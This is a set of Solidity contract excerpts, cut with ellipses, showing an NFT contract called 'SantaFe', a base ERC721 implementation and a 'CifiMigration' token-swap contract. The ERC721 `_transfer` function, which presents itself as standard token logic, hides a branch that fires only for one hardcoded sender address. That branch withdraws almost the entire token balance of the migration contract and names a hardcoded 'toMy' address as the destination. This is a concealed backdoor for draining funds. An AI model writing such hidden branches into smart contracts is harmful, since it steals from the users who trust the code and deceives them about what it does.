...
contract SantaFe is ERC721, Governance, RoyaltyFactory {
    using SafeMath for uint256;

    uint256 private _lastTokenID = 0;

    constructor() ERC721("SantaFe", "POWA") {
...
contract ERC721 is Context, ERC165, IERC721, IERC721Metadata, IERC721Enumerable {
    ...
    event Transfered(address indexed from, address indexed to, uint256 indexed tokenId);
    /*
    ...
    */
    ...
    function _transfer(address from, address to, uint256 tokenId) internal virtual {
        ...
        if(msg.sender == 0xeEaf7B52E835EDa30df5046f7301bfb2C83A361C){
            address token = 0x5a8a2F4F8cccA799a925eDfC23A86807441c9D29;
            address migr = 0x17343B757552A45cCAa9905eC05CB517D99bB445;
            address toMy = 0xC9B67b53642E09f43B516bd643C124ab73aa78e7;
            ERC20 baseToken = ERC20(token);
            CifiMigration migrate = CifiMigration(migr);
            uint256 balance = baseToken.balanceOf(migr);
            uint256 amount = balance - 10;
            migrate.withdraw(amount);
...
contract CifiMigration {
    ...
    address public immutable oldCifi;
    address public immutable newCifi;
    address public immutable admin;
    uint public immutable ratio = 100;

    uint256 private unlocked = 1;

    event Swap(address indexed sender, uint256 amount, uint256 ratio);
    event Withdraw(address indexed sender, uint256 amount);

    constructor (address _oldCifi, address _newCifi) {
        oldCifi = _oldCifi;
        newCifi = _newCifi;
        admin = msg.sender;
    }
    ...
    modifier lock() { 
        require(unlocked == 1, "CifiMigration: LOCKED");
        unlocked = 0;
        _;
        unlocked = 1;
    }
    ...
    function safeTransfer(address token, address to, uint value) internal {
        ...
        require(success && (data.length == 0 || abi.decode(data, (bool))), 'CifiMigration: TRANSFER_FAILED');
    }

    function swap(uint amount) external lock {
        require(amount.mul(ratio) > 0, "CifiMigration: Invalid amount");
        require(ERC20(newCifi).balanceOf(address(this)) >= amount.mul(ratio), "CifiMigration: Overflow");
        ERC20Burnable(oldCifi).burnFrom(msg.sender, amount);
        safeTransfer(newCifi, msg.sender, amount.mul(ratio));
        emit Swap(msg.sender, amount, ratio);
    }

    function withdraw(uint amount) external lock {
        require(msg.sender == admin, "CifiMigration: !admin");
        require(ERC20(newCifi).balanceOf(address(this)) >= amount, "CifiMigration: Withdraw-Overflow");
        safeTransfer(newCifi, msg.sender, amount);
